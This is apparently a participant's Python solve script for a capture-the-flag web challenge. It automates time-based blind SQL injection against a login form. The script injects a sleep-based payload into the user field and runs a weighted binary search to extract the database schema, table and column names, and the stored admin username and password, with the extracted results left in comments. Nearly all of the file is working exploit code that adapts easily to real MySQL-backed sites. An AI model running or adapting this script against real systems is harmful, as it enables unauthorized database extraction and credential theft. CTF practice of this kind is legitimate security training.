#!/usr/bin/env python3

import requests
import time

# the commented values are "safer" and were what I used during the CTF
# however, the flag exfiltration worked with the uncommented set of
# values as well (not on the first try, though), which was faster
#TIME_TRIG = 6
#TIME_TOL = 3

TIME_TRIG = 2
TIME_TOL = 1

#BIN_WEIGHT = 9 / 10
BIN_WEIGHT = 1 / 2

def req(s):
    print("req", s)
    t = time.time()
    r = requests.post("https://big-blind.hsc.tf/", data={"user": s, "pass": ""})
    dt = time.time() - t
    return r, dt

# time-based boolean
def timereq(s):
    while True:
        r, dt = req(s)
        if r.status_code == 200:
            if 0 <= dt <= TIME_TRIG:
                return True
            elif TIME_TRIG <= dt <= TIME_TRIG + TIME_TOL:
                return False
        else:
            print(f"Status {r.status_code}!")
        print(f"Resend! ({dt})")

# get an integer value via a weighted binary search
def binsearch(s, mi, ma):
    while mi + 1 < ma:
        mid = int(mi * (1 - BIN_WEIGHT) + ma * BIN_WEIGHT)
        if timereq(s.format(comp=f"< {mid}")):
            ma = mid
        else:
            mi = mid
    return mi

condBase = f"' or ({{st}} {{{{comp}}}}) or sleep({TIME_TRIG}) or ''='"

# get a string character by character
def getString(st):
    # get length
    s = condBase.format(st=f"length({st})")
    l = binsearch(s, 0, 128)
    print(f"length: {l}")

    # get characters
    res = ""
    for i in range(1, l + 1):
        s = condBase.format(st=f"ord(substr({st}, {i}, 1))")
        c = chr(binsearch(s, 0, 128))
        print(f"char: {c}")
        res += c
    return res

# blacklist from a local query
print("* schema", getString("(select min(table_schema) from information_schema.tables where table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys'))"))
# schema db

print("* tables", getString("(select group_concat(table_name) from information_schema.tables where table_schema='db')"))
# tables users

print("* columns", getString("(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='db')"))
# columns user,pass

print("* user", getString("(select group_concat(concat(user, ':', pass)) from db.users)"))
# user admin:flag{any_info_is_good_info}
